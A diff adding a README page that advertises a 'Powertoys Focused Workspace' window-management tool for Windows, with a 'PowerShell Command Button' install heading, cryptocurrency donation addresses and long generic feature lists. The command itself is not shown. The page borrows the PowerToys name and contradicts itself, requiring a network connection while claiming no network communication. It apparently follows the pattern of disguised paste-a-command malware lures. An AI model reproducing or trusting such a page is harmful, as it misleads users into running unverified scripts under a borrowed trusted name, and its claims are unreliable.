@@ -1,0 +1,91 @@
+Powertoys Focused Workspace: Productivity Desktop Client for Windows 11
+
+⌨️ PowerShell Command Button
+
+Send a small thank-you
+
+TRON:&nbsp;TDMHwh7eqFapWadjbCem7BjX5XTiDVhdE3 | ETH:&nbsp;0x403885b7DeCE45890469d084ca8454057b4F0e52
+
+Powertoys Focused Workspace is a desktop utility designed to streamline multitasking by managing application window focus across defined workspaces. It provides deterministic control over window activation, grouping, and switching, reducing manual window management overhead in complex desktop environments. The application exposes configurable focus rules and workspace profiles, enabling precise orchestration of window states across multiple monitors and virtual desktops. Built for reliability and low resource consumption, it integrates with existing desktop workflows while maintaining consistent behavior under heavy application loads.
+
+✅ Requirements
+
+- Windows 10 or Windows 11
+- PowerShell 5.1 or newer (already available on Windows)
+- Active network connection
+- No admin rights needed
+
+Features
+
+- Workspace isolation: Creates a dedicated, focused desktop environment that separates the active task set from peripheral applications and windows, reducing visual and cognitive context switching.
+
+- Application grouping: Allows users to define named workspace profiles that bundle specific applications, window layouts, and launch order into a single reproducible configuration.
+
+- Selective window filtering: Filters the visible window set to only those belonging to the active workspace, temporarily hiding unrelated windows without terminating their processes.
+
+- Layout persistence: Saves and restores window positions, sizes, and monitor assignments per workspace profile, ensuring consistent geometry across sessions.
+
+- Multi-monitor awareness: Detects connected displays and maps workspace layouts to specific monitors, adapting gracefully when display configurations change.
+
+- Quick workspace switching: Provides keyboard-driven switching between defined workspaces, with configurable shortcuts for activation, cycling, and teardown.
+
+- Process state preservation: Keeps background applications running while suppressed, so switching into or out of a workspace does not interrupt long-running tasks or lose unsaved state.
+
+- Rule-based assignment: Supports configurable rules that automatically route newly opened windows to the appropriate workspace based on process name, window title, or class.
+
+- Integration with PowerToys modules: Operates alongside existing PowerToys utilities, respecting shared settings storage and consistent configuration conventions.
+
+- Lightweight runtime footprint: Implements window management through native OS APIs, avoiding heavy virtualization or containerization overhead.
+
+- Configuration export and import: Enables workspace definitions to be serialized to a local file for backup, transfer, or version-controlled management.
+
+- Per-workspace startup actions: Optionally triggers defined launch sequences, scripts, or application starts when a workspace is activated.
+
+How it works
+
+Powertoys Focused Workspace operates as a lightweight orchestration layer that runs alongside Microsoft PowerToys and coordinates window state through the native Windows management APIs. At its core, the application maintains a persistent workspace model: a serialized definition of application groups, window placements, and layout geometry. Each time a workspace is activated, the engine reconciles the current desktop state against this model rather than blindly recreating it, repositioning existing windows where possible and launching only the applications that are not already running.
+
+Window placement is handled by a geometry resolver that translates abstract zone definitions into concrete screen coordinates. The resolver accounts for display topology at runtime, so layouts defined on a multi-monitor configuration map predictably onto the active monitor set, including per-monitor DPI scaling. Zones are anchored rather than fixed, meaning windows retain proportional placement when resolution or scaling changes between sessions.
+
+Application identity is tracked through process and window handles resolved via the Windows shell, with executable paths stored in the workspace definition for reliable matching. The engine distinguishes between single-instance and multi-instance applications, applying the appropriate launch and focus strategy for each. Startup sequencing is dependency-aware: applications are launched in defined order, and placement is deferred until each window reports a ready state, preventing race conditions during layout application.
+
+The background service runs with a minimal footprint and no persistent UI. It exposes state transitions through local events, allowing workspace activation, save, and restore operations to execute without blocking the desktop. Workspace definitions are stored as human-readable structured files, enabling version control, manual editing, and portability across machines. All operations are confined to the local user session; no network communication is performed.
+
+Modules and Settings
+
+Focus Layout Creator
+Defines the on-screen arrangement that a task workspace will use, so window placement becomes a saved decision rather than repeated dragging.
+- Region assignment lets you choose which screen areas certain window types should occupy and how much space each region receives.
+- Layout scope controls whether unrelated windows are moved aside or left untouched when the arrangement is applied.
+- Live preview shows the intended arrangement before committing it, so you can adjust proportions without disturbing open windows.
+- Layout duplication lets you reuse a promising arrangement as the starting point for a variation instead of rebuilding it.
+
+Task Window Groups
+Collects windows into named, task-oriented collections that serve as the unit the other modules act on.
+- Group editor lets you add or remove windows, rename collections, and reorder them to match how you move between tasks.
+- Membership view shows which windows currently belong to a group, making it easy to spot stale or missing entries.
+- Group notes give each collection a short description of its purpose, useful when several groups look similar.
+- Groups can be linked to a layout and a monitor assignment, so recalling a group also recalls how it should be presented.
+
+Group Switcher
+Turns moving between task contexts into a single deliberate action rather than a sequence of window manipulations.
+- Active group selection lets you pick the target collection and immediately apply its associated arrangement.
+- Prior-window handling controls whether windows from the previous group are hidden or simply repositioned out of the way.
+- Switch confirmation can be enabled to preview the change before it takes effect, helpful when groups contain many windows.
+- Quick recall surfaces the groups most recently used so frequent transitions need fewer steps.
+
+Focus Mode and Suppression
+Reduces visual noise while a group is active by controlling what remains visible on the desktop.
+- Suppression scope determines whether all non-group windows are hidden or only a selected subset.
+- Pause control temporarily suspends suppression without ending the focus session.
+- Exclusion list protects windows that should always remain visible, such as a clock or monitoring panel.
+- Release action restores all suppressed windows at once when the focus period ends.
+
+Display Assignment
+Connects groups and layouts to specific monitors so multi-screen setups reflect the intended split of work.
+- Per-group display targeting selects which monitor a layout should occupy.
+- Multi-monitor spread lets a single group place different windows on different displays.
+- Disconnect behavior settings define how assigned windows are handled when a monitor is removed or added.
+- Display overview shows current assignments across connected screens, making mismatches easy to correct.
+
+…（内容已截断）
